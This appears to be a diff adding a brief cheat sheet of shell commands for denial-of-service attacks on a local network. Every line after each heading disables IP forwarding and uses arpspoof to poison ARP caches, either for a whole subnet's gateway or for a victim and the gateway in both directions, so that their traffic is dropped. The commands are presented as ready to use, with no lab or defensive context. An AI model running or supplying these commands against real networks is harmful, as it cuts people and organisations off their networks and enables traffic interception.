@@ -1,0 +1,11 @@
+# DOS network
+echo 0 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 <gateway ip>
+
+# DOS single target
+echo 0 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t <victim ip> <gateway ip>
+arpspoof -i eth0 -t <gateway ip> <victim ip>
+
+
+
